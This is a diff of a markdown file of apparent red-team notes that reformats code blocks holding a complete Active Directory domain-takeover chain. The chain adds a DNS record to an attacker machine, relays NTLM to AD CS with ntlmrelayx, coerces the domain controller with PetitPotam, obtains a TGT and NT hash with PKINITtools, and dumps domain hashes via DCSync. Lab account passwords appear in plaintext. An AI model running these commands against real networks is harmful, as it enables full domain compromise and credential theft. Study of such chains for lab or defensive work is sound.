@@ -364,19 +364,31 @@ nameserver 192.168.0.100
 ```
 
 ### Add DNS entry to domain (pointing to our attacker machine) (https://github.com/dirkjanm/krbrelayx)
-```sudo python3 dnstool.py -u "redteam.local\\adm_engserver" -p "MOdfr391tU3U2jS9vY" -r 'pki41UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' -d "192.168.100.1" --action add "192.168.0.100"```
+```
+sudo python3 dnstool.py -u "redteam.local\\adm_engserver" -p "MOdfr391tU3U2jS9vY" -r 'pki41UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' -d "192.168.100.1" --action add "192.168.0.100"
+```
 
 ### Running ntlmrelayx for relaying request from DC01$ to CA to request a .pfx certificate as DC01$
-```sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -debug -smb2support --target http://ca01.redteam.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication```
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -debug -smb2support --target http://ca01.redteam.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
+```
 
 ### Running PetitPotam (https://github.com/topotam/PetitPotam) to obtain a certificate
-```sudo python3 PetitPotam.py -u 'adm_engserver' -p 'MOdfr391tU3U2jS9vY' -d redteam.local -dc-ip 192.168.0.100 'pki41UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc01.redteam.local```
+```
+sudo python3 PetitPotam.py -u 'adm_engserver' -p 'MOdfr391tU3U2jS9vY' -d redteam.local -dc-ip 192.168.0.100 'pki41UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc01.redteam.local
+```
 
 ### Running gettgtpkinit.py (https://github.com/dirkjanm/PKINITtools) to obtain a TGT as DC01$ for the DC01$.pfx
-```python3 gettgtpkinit.py redteam.local/DC01\$ -cert-pfx DC01\$.pfx DC01.ccache```
+```
+python3 gettgtpkinit.py redteam.local/DC01\$ -cert-pfx DC01\$.pfx DC01.ccache
+```
 
 ### Running getnthash.py (https://github.com/dirkjanm/PKINITtools) to obtain the NT hash of the DC01$ user (can be used to perform DCSync)
-```KRB5CCNAME=DC01.ccache python3 getnthash.py -dc-ip 192.168.0.100 redteam.local/DC01\$ -key {key_obtained_in_previous_command}```
+```
+KRB5CCNAME=DC01.ccache python3 getnthash.py -dc-ip 192.168.0.100 redteam.local/DC01\$ -key {key_obtained_in_previous_command}
+```
 
 ### Running DCSync/Secretsdump
-```python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'redteam.local'/'DC01$'@'192.168.0.100' -hashes :{nt_hash_from_previous_command}```
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'redteam.local'/'DC01$'@'192.168.0.100' -hashes :{nt_hash_from_previous_command}
+```
